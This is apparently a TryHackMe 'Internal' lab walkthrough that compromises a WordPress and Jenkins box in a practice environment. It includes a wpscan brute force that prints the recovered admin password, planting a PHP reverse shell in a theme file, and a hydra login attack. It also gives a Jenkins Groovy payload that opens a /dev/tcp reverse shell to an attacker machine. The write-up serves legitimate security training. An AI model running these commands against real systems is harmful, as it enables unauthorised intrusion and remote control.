# Internal

| [![Internal](../../_static/images/internal.png)](https://tryhackme.com/room/internal) |
|:--:|
| [https://tryhackme.com/room/internal](https://tryhackme.com/room/internal) |

The lead is a straight forward exploit of Wordpress, followed by exploitation that requires manual enumeration of 
the host file system. A Jenkins server is found running internally that leads to a Docker container, to a ...

Add target IP address to `/etc/hosts`, mapped to `internal.thm`.

## Scanning

Run a simple port scan (without Ping)

	nmap -Pn -p- <IP target> -oN portscan

portscan:

```text
# Nmap 7.92 scan initiated Mon Oct  3 01:52:19 2022 as: nmap -Pn -p- -oN portscan -vv 10.10.239.250
Nmap scan report for 10.10.239.250
Host is up, received user-set (0.050s latency).
Scanned at 2022-10-03 01:52:19 BST for 61s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Oct  3 01:53:20 2022 -- 1 IP address (1 host up) scanned in 61.35 seconds
```

Run an `-A` scan on the open ports:

	nmap -Pn -T4 -A -p80,135,139,445,3389,49663,49667,49669 <IP target> -oN servicescan

servicescan:

```text
# Nmap 7.92 scan initiated Mon Oct  3 02:11:37 2022 as: nmap -Pn -T4 -A -p22,80 -oN servicescan 10.10.239.250
Nmap scan report for 10.10.239.250
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   42.42 ms 10.9.0.1
2   42.41 ms 10.10.239.250

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct  3 02:11:49 2022 -- 1 IP address (1 host up) scanned in 12.11 seconds
```

## Exploring


## Find files and folders

    gobuster dir -u http://<IP target> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50

Results:

```text
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.239.250
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/10/03 01:57:45 Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 313] [--> http://10.10.239.250/blog/]
/index.html           (Status: 200) [Size: 10918]                               
/wordpress            (Status: 301) [Size: 318] [--> http://10.10.239.250/wordpress/]
...
===============================================================
2022/10/03 02:10:43 Finished
===============================================================
```

## Wordpress enumeration

    wpscan --url http://<IP target>/blog -e u

Results:

```text
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.239.250/blog/ [10.10.239.250]
[+] Started: Mon Oct  3 02:16:15 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.239.250/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.239.250/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.239.250/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.239.250/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.239.250/blog/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Oct  3 02:16:17 2022
[+] Requests Done: 65
[+] Cached Requests: 4
[+] Data Sent: 14.272 KB
[+] Data Received: 19.132 MB
[+] Memory used: 163.422 MB
[+] Elapsed time: 00:00:02
```

Brute-forcing the found password:

    wpscan --url http://<IP target>/blog -U admin -P /usr/share/wordlists/rockyou.txt

Results:

```text
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.239.250/blog/ [10.10.239.250]
[+] Started: Mon Oct  3 02:17:58 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.239.250/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.239.250/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.239.250/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.239.250/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.239.250/blog/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <=================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                     
Trying admin / bratz1 Time: 00:01:52 <                                                 > (3885 / 14348277)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Oct  3 02:19:57 2022
[+] Requests Done: 4028
[+] Cached Requests: 28
[+] Data Sent: 2.041 MB
[+] Data Received: 2.311 MB
[+] Memory used: 235.387 MB
[+] Elapsed time: 00:01:59
```

## Reverse shell

Log into WordPress as the admin user.

Copy and adapt the Laudanum PHP Reverse Shell found in `/usr/share/laudanum/php/php-reverse-shell.php` or the 
[PentestMonkey php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

1. Use "Appearance > Theme Editor > 404.php" and replace the PHP code with the PHP reverse shell.
2. Open a listener
3. Call the template in browser http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php

A shell as the `www-data` user is granted on the box.

Stabilise the shell:

    python -c "import pty;pty.spawn('/bin/bash')"

## Privilege escalation

MySQL credentials can often be found by inspecting the `wp-config.php` file. Alas.

Explore to find an interesting file in the `/opt` directory. Read it.

    su aubreanna

The user flag is in aubreanna’s home folder. 

    sudo -l
    Sorry, user aubreanna may not run sudo on internal.

There is a file in aubreanna’s home folder that tells us Jenkins is running on port 8080:

    netstat -tan | grep 8080

There already were indications that docker is available on the target, and Jenkins is often installed with docker.
If not a rabbit hole, this could be a way to elevate privileges to root. 

## Using SSH for port forwarding

Because port 8080 can only be accessed locally, we need to set up port forwarding to redirect traffic to localhost 
on port 1234 to the target machine on port 8080:

```text
$ ssh -f -N -L 1234:127.0.0.1:8080 aubreanna@<IP target>
$ nmap -sC -sV -p 1234 127.0.0.1
```

Jenkins is now available on `127.0.0.1:1234/login?from=%2F` from the attack machine.

## Jenkins' admin password

Default credentials do not seem to work. Intercept the POST request in Burpsuite to be able to 
build the hydra command.

Hydra:

```text
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP target> -s 8888 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

Log in to Jenkins with the found username and password.

## Reverse shell in docker

Start a listener:

    nc -nlvp 5555

In Jenkins, go to "Jenkins > Nodes > master" and click on "Script Console". Enter (change the
necessary parameters):

```text
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP attack machine>/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

And execute. In the listener, we now have a reverse shell in docker. In `/opt` is a message 
`note.txt` for Aubreanna. :)

Go back to the initial SSH connection as aubreanna, and get the root flag:

    $ su root
    Password: 
    # cd /root/
